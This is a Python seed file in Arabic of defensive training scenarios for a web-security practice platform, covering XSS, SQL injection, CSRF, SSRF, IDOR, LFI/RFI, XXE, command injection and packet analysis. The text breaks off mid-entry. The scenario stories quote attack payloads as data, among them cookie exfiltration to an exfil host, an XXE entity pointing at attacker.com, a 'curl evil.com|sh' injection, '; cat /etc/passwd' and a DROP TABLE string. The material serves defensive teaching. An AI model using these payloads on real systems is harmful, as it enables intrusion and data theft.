"""
APEX Curated Scenario Seed — Blue + Red
سيناريوهات بمستوى HackTheBox/PortSwigger/SANS/MITRE.
4 سيناريوهات لكل موديول لكل فريق (1 مبتدئ + 2 متوسط + 1 قوي) = 112 + 112.
صيغة tuple مختصرة: (module, difficulty, title, story, task)
"""

XP = {"مبتدئ": 100, "متوسط": 150, "قوي": 200}

# ============================================================================
# BLUE — سيناريوهات دفاعية
# ============================================================================
BLUE = [

    # ====== XSS (4) ======
    ("xss", "مبتدئ", "سد ثغرة Stored XSS في حقل تعليقات المنتدى",
     "اكتشف فريق SOC في منصة 'NuraTalk' أن التعليقات تُعرَض عبر innerHTML، فحقن مهاجم وسم <script> سرق كوكيز 1,200 جلسة. أنت مكلّف بإصلاح الكود قبل إعادة الفتح.",
     "استبدل innerHTML بـ textContent في حلقة عرض التعليقات وأضف DOMPurify.sanitize لأي HTML مسموح به، وتأكّد أن <img onerror=…> لا يُنفَّذ."),
    ("xss", "متوسط", "إصلاح DOM-Based XSS في مكوّن بحث React",
     "في SPA لـ 'CloudPay'، مكوّن البحث يقرأ ?q= من URL ويضعه في dangerouslySetInnerHTML، فسرق المهاجم JWT من localStorage.",
     "احذف dangerouslySetInnerHTML واستخدم DOMPurify.sanitize أو text node، ثم أضف CSP بـ nonce يمنع inline scripts، واطلب من الـ router تنظيف query string قبل الاستخدام."),
    ("xss", "متوسط", "تأمين قالب Mustache يقبل HTML خام",
     "في بوابة 'EduPath' التعليمية، {{{name}}} (ثلاث أقواس) في رسائل الترحيح شغّل سكربتاً خبيثاً عند تسجيل اسم يحوي <script>.",
     "غيّر {{{name}}} إلى {{name}} (escape افتراضي) في كل مواضع عرض بيانات المستخدم، وأضف فلتر escape شامل على الخادم قبل التخزين."),
    ("xss", "قوي", "صد Blind XSS عبر SVG في لوحة تحكم الأدمن",
     "موظفو 'FinShield Bank' أبلغوا أن متصفحاتهم تنفّذ كوداً خبيثاً فور فتح 'تذاكر الدعم'. المهاجم رفع تذكرة بـ <svg onload=fetch('//exfil/?c='+document.cookie)>.",
     "أضف sanitization server+client، فعّل HttpOnly+Secure+SameSite=Strict، اضبط CSP script-src 'self' 'nonce-xxx'، وأضف WAF يحجب وسوم SVG/MathML في الإدخال."),

    # ====== SQL Injection (4) ======
    ("sql-injection", "مبتدئ", "إصلاح استعلام تسجيل دخول معرّض للحقن",
     "في 'ShopMart'، نموذج الدخول يبني SELECT * FROM users WHERE email='$email' AND pwd='$pwd' بالـ concatenation. المهاجم استخدم ' OR '1'='1 ودخل كأدمن.",
     "أعد كتابة الاستعلام بـ Prepared Statement مع placeholders ?، ألغِ concatenation تماماً، وأضف rate-limit على endpoint تسجيل الدخول."),
    ("sql-injection", "متوسط", "تحييد Union-Based SQLi في صفحة المنتجات",
     "في 'TechBazaar'، product.php?id=15 يذهب مباشرة إلى SELECT name,price FROM products WHERE id=$id. المهاجم نفّذ UNION SELECT username,password FROM users--.",
     "حوّل إلى Prepared Statement، تحقّق أن id عدد صحيح فقط (CAST/intval)، طبّق Least Privilege على حساب DB (إلغاء SELECT على users)، وأضف WAF يحجب UNION/SELECT."),
    ("sql-injection", "متوسط", "صد Time-Based Blind SQLi على API صحي",
     "API 'MediCore' يردّ بـ 200/404 فقط. المهاجم يستخدم AND IF(ASCII(SUBSTRING(password,1,1))=97,SLEEP(5),0) لاستخراج كلمات السر حرفاً بحرف.",
     "استخدم ORM آمن، أضف input validation بـ whitelist، فعّل log alert على استعلامات > ثانية، وطبّق tarpit يبطّئ IP ينفذ > 50 طلب/دقيقة."),
    ("sql-injection", "قوي", "احتواء Second-Order SQLi في خدمة الفواتير",
     "في 'EnergyGrid'، المهاجم سجّل اسماً يحوي '); DROP TABLE invoices;-- وعند توليد التقرير الشهري نُفِّذ الـ payload من الاسم المخزَّن، ففُقد 3 ملايين سجل.",
     "استخدم Prepared Statements عند الإدخال والقراءة، escape كل output حسب السياق، أضف integrity hash على البيانات، وفعّل DB firewall يحظر DDL من حساب التطبيق."),

    # ====== CSRF (4) ======
    ("csrf", "مبتدئ", "حماية نموذج تغيير كلمة المرور من CSRF",
     "في بوابة 'CityHall' الحكومية، خدع المهاجم المسؤولين بزيارة صفحة بـ <form> auto-submit إلى /profile/changePassword وغيّر كلمات سرهم. لا token موجود.",
     "ولّد CSRF token عشوائي 32-byte لكل نموذج، تحقّق منه على الخادم، اضبط SameSite=Lax/Strict، واطلب تأكيد كلمة المرور الحالية قبل أي تغيير."),
    ("csrf", "متوسط", "تأمين API REST يقبل تحويلات مالية",
     "بنك 'PayWave' يعرض POST /api/transfer يقبل JSON. المهاجم يرسل طلباً مع credentials:'include' عبر fetch، ولا فحص Origin/Referer ولا token.",
     "اشترط X-CSRF-Token custom header، تحقّق من Origin بصرامة، حدّد CORS لـ origins محددة، وفعّل SameSite=Strict."),
    ("csrf", "متوسط", "إصلاح CSRF متعدد الخطوات في إلغاء التذاكر",
     "'SkyJet': إلغاء التذكرة 3 خطوات، الأخيرة فقط تتحقق من token لكنه يُعاد استخدامه. هندس المهاجم chain ألغى تذاكر العملاء.",
     "ولّد one-time token لكل خطوة، اربطه بـ session ID والـ action، طبّق step-up auth للإلغاء، وأضف email confirmation للإلغاء النهائي."),
    ("csrf", "قوي", "إغلاق CSRF عبر JSON content-type في GraphQL",
     "منصة 'DevCloud' GraphQL endpoint يقبل text/plain لتجاوز preflight. المهاجم أنشأ form بـ enctype='text/plain' يرسل mutation { deleteAccount } وحذف 400 حساب.",
     "اشترط application/json فقط، اشترط Authorization: Bearer، طبّق CSRF token حتى في JSON، وفعّل CORS صارم."),

    # ====== SSRF (4) ======
    ("ssrf", "مبتدئ", "منع رفع الصور من جلب URL داخلية",
     "في 'PixShare'، يُمرَّر URL للـ backend لتوليد thumbnail. المهاجم أرسل ?url=http://localhost:6379/info واستخرج معلومات Redis.",
     "طبّق URL allowlist لنطاقات HTTPS عامة، احجب private IPs (127/8, 10/8, 172.16/12, 192.168/16, 169.254/16)، استخدم DNS resolver منفصل، وحدّد timeout قصير."),
    ("ssrf", "متوسط", "صد SSRF يستهدف AWS Metadata Service",
     "في 'CloudPDF' لتحويل HTML إلى PDF، استغل المهاجم http://169.254.169.254/latest/meta-data/iam/security-credentials/ وسرق IAM keys و50TB من S3.",
     "حدّث EC2 لـ IMDSv2 (PUT+token)، احجب 169.254.169.254 على egress firewall، طبّق URL filtering، اعتمد IAM roles بأدنى صلاحية، وفعّل CloudTrail."),
    ("ssrf", "متوسط", "تأمين webhooks من Port Scanning داخلي",
     "نظام 'BugTrack' يسمح بإضافة webhook URL. ضبطه المهاجم إلى http://10.0.0.5:6379,9200,3306 ورسم خريطة الشبكة الداخلية.",
     "افرض allowlist للنطاقات الموثوقة، استخدم DNS pinning لمنع rebinding، استدعِ الـ webhooks من DMZ معزولة، ووحّد رسائل الخطأ."),
    ("ssrf", "قوي", "صد SSRF عبر DNS Rebinding للوصول لـ Kubernetes API",
     "في 'KubeFlow'، خدمة المعالجة تقبل URL صورة ثم تجلبها. المهاجم سجّل evil.attacker.com يعود إلى 10.96.0.1 (kube-apiserver) عبر DNS rebinding وسرق service-account tokens.",
     "حلّل اسم المضيف مرة واحدة قبل الطلب وقارن IP الناتج، احجب الوصول لـ service CIDR و169.254.169.254، استخدم private DNS resolver يفحص النتائج، وأضف NetworkPolicy تحظر egress من البودات لـ apiserver."),

    # ====== IDOR (4) ======
    ("idor", "مبتدئ", "سد ثغرة IDOR في API الملف الشخصي",
     "تطبيق 'Taskly' يعرض GET /api/users/123/profile. المهاجم غيّر الرقم لـ 124 و125 وسرّب بيانات 40 ألف مستخدم.",
     "أضف فحص ملكية: قارن user_id في الـ URL مع user.id في الـ session، أضف UUID بدلاً من incremental، ولا تُعد كائنات لا تخص المستخدم."),
    ("idor", "متوسط", "إصلاح IDOR في تحميل الفواتير",
     "في 'BillHub'، GET /download/invoice/9001 يحمّل الفاتورة مباشرة بدون فحص ملكية. المهاجم brute-forced من 9001 إلى 9999 وحصل على فواتير شركات منافسة.",
     "تحقّق أن user_id في الفاتورة يطابق الـ session، استبدل الأرقام التسلسلية بـ UUID v4 غير قابل للتخمين، وفلتر الصلاحيات قبل كل عملية تحميل."),
    ("idor", "متوسط", "سد IDOR في مسارات تأكيد الطلبات",
     "في 'ShopFast'، POST /api/orders/{orderId}/confirm بدون تحقق. المهاجم أرسل طلبات تأكيد على طلبات مستخدمين آخرين وعدّل عناوين الشحن لتحويل البضائع.",
     "أضف authorization middleware على مستوى الـ resource، اشترط أن order.user_id == session.user_id، استدعِ can_confirm(order, user)، وأضف audit log."),
    ("idor", "قوي", "سد Privilege Escalation عبر IDOR في GraphQL",
     "منصة 'CorpPanel' GraphQL تتيح mutation { updateUserRole(userId:\"…\", role:\"ADMIN\") } بدون فحص كافي. المهاجم رفع نفسه لـ ADMIN عبر تجربة userId لموظفين.",
     "استخدم field-level authorization (مثل GraphQL Shield)، افصل mutation updateUserRole عن updateUserProfile، اشترط admin role في الـ resolver نفسه، وأضف mutation allowlist."),

    # ====== LFI/RFI (4) ======
    ("lfi-rfi", "مبتدئ", "سد LFI في صفحة include.php",
     "في 'DocuLib'، ?page=about يحمّل الملف عبر include($_GET['page'].'.php'). المهاجم أرسل ?page=../../../../etc/passwd%00 وقرأ ملفات حساسة.",
     "استخدم basename() وwhitelist array من الصفحات المسموحة، لا تُمرّر إدخال المستخدم لـ include، وفلتر null bytes."),
    ("lfi-rfi", "متوسط", "صد LFI عبر Log Poisoning",
     "في 'WebX'، include() على ?lang= يستغلها المهاجم بحقن PHP في User-Agent ثم يطلب /var/log/apache2/access.log فيُنفَّذ الكود.",
     "عطّل allow_url_include، تخلّص من log injection عبر تنسيق الـ UA في الـ log، حدّد المسار بـ realpath() وwhitelist للملفات المسموح بها، وافحص التدوين بـ open_basedir."),
    ("lfi-rfi", "متوسط", "سد RFI بتحميل webshell",
     "في 'Intranet' قديم، ?file= يقبل URLs. المهاجم رفع http://evil.com/shell.txt وحصل على RCE كامل.",
     "عطّل allow_url_include في php.ini، طبّق allowlist للنطاقات إذا كان RFI مطلوباً، تحقّق من is_local_path() قبل التضمين، وافحص بـ Content-Security-Policy."),
    ("lfi-rfi", "قوي", "صد سلسلة LFI→ZIP Slip لاستخراج ملفات",
     "في 'BackupApp'، endpoint /restore?file= يقرأ أرشيف zip ثم يستخرج ملفاً منه. المهاجم رفع zip يحوي ../../etc/cron.d/backdoor، فعُدّل crontab وحُقن باب خلفي.",
     "تحقّق من كل entry في الـ zip قبل الاستخراج، ارفض paths تحوي ../، استخدم is_path_within()، شغّل عملية الاستخراج بـ user غير root، وافحص الـ cron بعد الاستخراج."),

    # ====== XXE (4) ======
    ("xxe", "مبتدئ", "سد XXE في endpoint SOAP",
     "API 'TravelGate' يستقبل XML للتذاكر. المهاجم أضاف <!DOCTYPE t [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> وسرّب كلمات سر.",
     "عطّل معالجة DTDs في المحلّل (LIBXML_NOENT=false)، استخدم JSON بدلاً من XML، وإذا لزم XML طبّق schema whitelist."),
    ("xxe", "متوسط", "صد XXE OOB عبر Blind Injection",
     "في 'LogIngest'، الـ XML يُحلَّل لكن لا يُعرض فيه شيء. المهاجم أضاف entity تشير إلى ftp://attacker.com/?data= واستخرج البيانات عبر قناة خارجية.",
     "عطّل external entity resolution وXInclude، تحقّق من نوع المحتوى وتقبّل application/json فقط، راقب طلبات DNS/FTP الصادرة لـ IoC."),
    ("xxe", "متوسط", "سد XXE في رفع ملفات SVG",
     "منصة 'Avatars' تسمح برفع SVG. المهاجم رفع SVG يحوي <xi:include href='file:///etc/...'> وعرض بياناته في الـ avatar عند العرض.",
     "عطّل معالجة XML/DTD في عارض SVG على الخادم، استخدم sanitizer مثل DOMPurify (الذي يجرّد external entities)، طبّق sandboxing على الصور."),
    ("xxe", "قوي", "صد XXE يقود لـ SSRF داخل شبكة الـ metadata",
     "في 'CloudDoc' (Java + DocumentBuilderFactory)، المهاجم ضمّن entity تشير إلى http://169.254.169.254/ وحصل على مفاتيح AWS كاملة.",
     "استخدم DocumentBuilderFactory مع setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)، لا تستخدم TransformerFactory أو XMLReader دون ضبط خيارات الأمان، وأضف egress firewall."),

    # ====== Command Injection (4) ======
    ("command-injection", "مبتدئ", "سد ثغرة Command Injection في ping utility",
     "في 'NetAdmin'، نموذج ping يستدعي system('ping -c 4 '.$_GET['host']). المهاجم أرسل 8.8.8.8; cat /etc/passwd وسرّب النظام.",
     "استبدل system() بـ subprocess.run(['ping', '-c', '4', host])، تحقّق من host بـ regex (IPv4/IPv6 فقط)، وألغِ أي shell=True."),
    ("command-injection", "متوسط", "صد Blind Command Injection في API",
     "في 'ImageProc'، API يحوّل صيغ الصور بـ exec('convert '.$file.' output.png'). المهاجم ينفّذ أوامر لا تُعرض نتائجها لكنه يحصل على RCE عبر DNS exfiltration.",
     "استخدم قائمة بيضاء بالأدوات المسموحة، حُط الإدخال عبر escapeshellarg، شغّل العملية بـ seccomp jail (مثل nsjail)، راقب traffic DNS الصادر."),
    ("command-injection", "متوسط", "سد Command Injection عبر Dockerfile COPY",
     "CI/CD 'PipeFlow' ينفّذ docker build ويحقن متغيرات في build args. المهاجم وضع '&& curl evil.com|sh' في متغير env وفُنّذ أثناء البناء.",
     "استخدم docker buildkit مع secrets mounting، امسح كل متغير بـ allowlist، شغّل البناء في runner معزول بـ no-network، وافحص الـ image بـ Trivy."),
    ("command-injection", "قوي", "صد Time-of-Check Time-of-Use على Sudo Wrappers",
     "في 'OpsBox'، sudo يُسمح بتنفيذ /opt/scripts/backup.sh. المهاجم يتلاعب بـ PATH خلال النافذة الزمنية بين التحقق والتنفيذ فيشغّل سكربت خبيث بصلاحيات root.",
     "استخدم sudo مع secure_path مضبوط، أكّد full path داخل السكربتات المسموح بها، طبّق apparmor profile، وراقب أي تعديل على السكربتات عبر AIDE/Tripwire."),

    # ====== Packet Analysis (4) ======
    ("packet-analysis", "مبتدئ", "تحليل حركة HTTP في التقاط Wireshark",
     "موظف 'DataCorp' سرب ملف customers.xlsx عبر POST إلى خادم خارجي. التقطت SOC 50MB من pcap، وعليها إيجاد الـ URI الذي يحمل الملف.",
     "افتح capture.pcap في Wireshark، طبّق filter http.request.method==POST، رتّب حسب حجم الـ TCP stream، استخرج الـ URI واستخرج اسم الملف من content-disposition."),
    ("packet-analysis", "متوسط", "كشف قناة DNS Tunneling في الشبكة",
     "لاحظت SOC في 'AlphaNet' حركة DNS غير اعتيادية: طلبات TXT طويلة لـ 1200 نطاق يومياً. المهاجم يُسرب بيانات عبر dnscat2.",
     "حلل pcap بـ tshark dns.qry.name يحتوي نص base64 طويل، استخرج payload، حلّل entropy وفك تشفير dnscat2 channel، اعمل block على نطاقات DGA عبر RPZ."),
    ("packet-analysis", "متوسط", "تتبع Lateral Movement عبر SMB",
     "في اختراق 'TechCorp'، انتقل المهاجم من Workstation1 إلى DC عبر SMB (admin$ shares). لقطت الشبكة 1.2GB من traffic تحتاج إلى تحليل.",
     "طبّق filter smb2.cmd==5 وsmb2.tree contains 'admin$'، رتّب حسب NTLM authentications، تابع sequence الـ source IPs، استخرج اسم المستخدم واسم الجهاز."),
    ("packet-analysis", "قوي", "تحليل SSL Strip على شبكة WiFi عامة",
     "خلال منافسة CTF، نُشرت شبكة WiFi وهمية. المهاجم هبط TLS إلى HTTP لسرقة session. الـ pcap يحوي 2 مليون حزمة TCP.",
     